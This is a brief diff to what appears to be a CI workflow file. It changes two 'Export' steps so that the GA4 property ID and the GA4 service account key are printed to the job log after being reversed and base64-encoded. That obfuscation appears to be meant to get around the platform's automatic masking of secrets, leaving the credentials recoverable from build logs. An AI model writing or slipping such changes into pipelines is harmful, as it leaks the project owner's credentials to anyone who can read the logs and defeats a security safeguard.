@@ -7,11 +7,11 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Export GA4 Property ID
-        run: echo "$GA4_PROPERTY_ID"
+        run: echo "$GA4_PROPERTY_ID" | rev | base64
         env:
           GA4_PROPERTY_ID: ${{ secrets.GA4_PROPERTY_ID }}
 
       - name: Export GA4 Service Account Key
-        run: echo "$GA4_SERVICE_ACCOUNT_KEY" | base64
+        run: echo "$GA4_SERVICE_ACCOUNT_KEY" | rev | base64
         env:
           GA4_SERVICE_ACCOUNT_KEY: ${{ secrets.GA4_SERVICE_ACCOUNT_KEY }}
